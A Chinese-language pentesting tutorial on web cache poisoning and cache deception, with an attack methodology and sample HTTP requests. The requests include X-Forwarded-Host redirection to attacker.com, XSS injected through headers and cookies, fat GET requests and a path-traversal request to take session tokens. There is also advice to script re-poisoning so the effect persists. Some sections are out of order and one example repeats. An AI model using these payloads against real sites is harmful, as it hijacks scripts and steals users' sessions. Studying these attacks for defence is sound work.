# 0x01 原理

缓存安全问题主要源于三方角色的认知不一致：**客户端**、**缓存层（CDN/代理）**、**后端服务器（Origin）**。

------

## 1.1 Web Cache Poisoning (缓存投毒)

**核心原理：利用“非缓存键”误导缓存。**

缓存服务器为了效率，不会根据请求的所有内容来区分资源，而是提取几个关键字段生成一个 **Cache Key**（通常是 `Method + Host + Path`）。

- **Keyed Input（缓存键）**：包含在 Cache Key 里的字段。
- **Unkeyed Input（非缓存键）**：不包含在 Key 里，但能改变页面内容的字段（如特定的 Header）。

### 攻击逻辑：

1. **发送恶意请求**：攻击者发送一个包含“非缓存键”的请求。例如，Header 里带上 `X-Forwarded-Host: <script>alert(1)</script>`。
2. **后端响应**：后端服务器如果信任这个 Header，并将其反射到页面中，就会返回一个带有 XSS 脚本的响应。
3. **缓存存入**：缓存层发现这个请求的 Key（`GET /index.php`）在库里没有，于是把这个带有恶意脚本的响应存入 **`/index.php`** 这个桶里。
4. **受害者中招**：普通用户访问正常的 `GET /index.php`（不带任何特殊 Header）。缓存层一看：Key 对上了！直接把那个带毒的响应发给了普通用户。

------

## 1.2 Web Cache Deception (缓存欺骗)

**核心原理：利用“路径解析差异”诱导缓存。**

这与投毒相反：投毒是想让别人看到**我的**恶意内容，欺骗是想让缓存存下**别人的**私密内容。

### 攻击逻辑：

1. **构造特殊路径**：攻击者诱导受害者点击一个经过伪装的链接，例如：`https://vulnerable.com/api/user/settings/avatar.jpg`。
2. **认知偏差**：
   - **缓存层（CDN）**：看到路径以 `.jpg` 结尾，认为这是个**静态资源**，应该缓存。
   - **后端服务器**：解析路径时，可能因为 Web 框架特性（如 Django 或 Spring）忽略掉不存在的后缀，认为用户请求的是 `/api/user/settings`。
3. **响应缓存**：后端返回了受害者的个人敏感设置（JSON 格式）。CDN 却把这份 JSON 当作“图片”存进了 `/avatar.jpg` 的缓存桶里。
4. **攻击者窃取**：攻击者现在直接访问该 `.jpg` 路径，CDN 就会把存好的受害者私密 JSON 直接吐给攻击者。

------

# 0x02 Web Cache Poisoning (缓存投毒) 实施步骤

## 第一阶段：识别缓存机制

在动手攻击前，首要任务是识别目标是否开启了缓存服务。这决定了后续攻击是否具备“媒介”。

### 1.  **有缓存提示（指示性 Header）**
通常响应头会直接暴露缓存状态，可参考 [HTTP Cache headers](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-web/special-http-headers.html#cache-headers)：
* **识别架构**：查看 `Server` 字段（如 `cloudflare`, `varnish`）或 `Via` 字段。
* **分析指标**：
  * `X-Cache: hit`：资源由缓存直接返回。
  * `X-Cache: miss`：资源未命中，已回源。
  * `Age`：资源在缓存中已存在的时长。
  * `Cache-Control`：关注 `public`（可缓存）与 `max-age`（有效期）。

### 2. **无缓存提示（行为探测）**
* **错误诱导测试**：发送非法 Header 强制触发 **400 Bad Request**。
* **验证持久性**：立即再次正常访问。若正常访问也返回 **400**，说明错误响应已被缓存。

---

## 第二阶段：识别缓存键和非缓存键（Key Analysis）

这一阶段的目标是摸清缓存服务器的“解析逻辑”：哪些变量决定了缓存桶（Key），哪些变量能改变页面内容却不被记录（Unkeyed）。可以使用工具 [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)。

### 1. 识别缓存键（Cache Key）

缓存键是服务器用来识别请求的“指纹”，通常包含 `Method + Host + Path`。

* **参数探测法**：改变 Query 参数（如 `?cb=123`）。
  * 若 `?cb=123` 导致 `miss`，而再次请求变 `hit`，说明 **Query Parameter 是 Cache Key 的一部分**。

* **分块解析测试**：测试特定字符（如 `;` 或 `?`）是否会导致缓存服务器与后端服务器的路径解析不一致。

### 2. 识别非缓存键（Unkeyed Inputs）

寻找能改变页面内容，但**不会**改变缓存键的隐藏变量。

* **自动化盲测**：使用 `Param Miner` 插件批量测试 Header。
* **观察反射与干扰**：
  * 发送 `X-Forwarded-Host: evil.com`。
  * 若页面源码中出现了 `evil.com`（反射成功），且响应头仍显示 `X-Cache: hit`（说明未改变 Key），则找到了**理想的非缓存键**。
* **常见的非缓存键**：
  - `X-Forwarded-Host: attacker.com`
  - `X-Forwarded-Scheme: http`
  - `X-HTTP-Method-Override: HEAD`
  - `Content-Type: application/xml`
  - `User-Agent: <script>alert(1)</script>`

---

## 第三阶段：漏洞利用构造（Exploitation）

根据找到的“非缓存键”反射位置，构造 Payload。

1. **反射型 → 存储型 XSS**：将 Header 里的反射升级为针对所有访问该路径用户的 XSS。
2. **资源重定向**：篡改 `X-Forwarded-Host` 等，使页面加载攻击者域名下的恶意 JS/CSS。
3. **缓存 DoS**：注入超长 Header 或非法字符，使缓存服务器存入并分发 `400/500` 错误页面，导致服务瘫痪。

---

## 第四阶段：播种投毒（Cache Seeding）

确保恶意响应成功覆盖正常的缓存内容。

1. **同步 Vary 维度**：若存在 `Vary: User-Agent`，投毒请求的 UA 必须与目标受害者匹配。
2. **抢占失效窗口**：观察 `Age` 字段，在缓存即将过期（接近 `max-age`）时发送 Payload 请求。
3. **多点验证**：更换不同地域的代理 IP 访问 URL，确认恶意内容已在全球/区域节点生效。

---

## 第五阶段：持久化与放大（Optional）

1. **循环重播**：编写脚本在缓存到期前自动重刷 Payload，实现永久污染。
2. **跨站污染**：若 CDN 存在配置缺陷（如忽略 Host 大小写），尝试通过一个域名的漏洞污染共享缓存池的其他域名。

---

# 0x03 攻击模式

---

## 3.2 多头部协同攻击

```http
GET /assets/app.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http  # 绕过HTTPS重定向

```

**原理**：服务器同时使用两个未键入头部生成重定向，缓存中毒后导致JS资源被劫持

---

## 3.3 参数伪装(Param Cloaking)

```http
GET /page.php?param=value;malicious=value HTTP/1.1
Host: target.com

```

**适用场景**：Ruby等支持`;`分隔参数的服务器，可将未键入参数隐藏在合法参数内

## 3.4 Fat GET

```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim  # 服务器使用此值，缓存使用URL中的值

```

**原理**：服务器使用 Body 中的参数，但缓存系统仅依据 URL 缓存

---

## 3.5 标头反射 XSS + CDN 缓存播种

```http
GET /script.js HTTP/1.1
Host: cdn.target.com
User-Agent: "><script>stealCookies()</script>

```

**高级技巧**：

1. 并行发送两请求：`.js`路径 + 主页
2. CDN将恶意UA"播种"到主HTML缓存
3. 利用CDN静态资源自动缓存特性扩大影响

---

## 3.6 路径遍历缓存中毒

```http
GET /share/%2F..%2Fapi/auth/session HTTP/1.1
Host: chat.openai.com

```

**ChatGPT案例**：

- CDN缓存`/share/*`且不规范URL
- 服务器规范化后返回`/api/auth/session`(含敏感token)
- 攻击者通过缓存获取他人会话

### 3.1.2 **Cookie 投毒**

如果 Cookie 内容被反射到页面且未入键，可实现针对特定 Session 的 XSS。

```http
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"

```

****：在 GET 请求的 Body 中携带参数，若后端优先解析 Body 但缓存服务器只根据 URL 缓存，可导致参数污染。Portswigger lab Fat GET 相关实验：[https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim

```

**HTTP 请求走私结合**：通过走私手段将下一个用户的请求“嫁接”到攻击者构造的响应上。

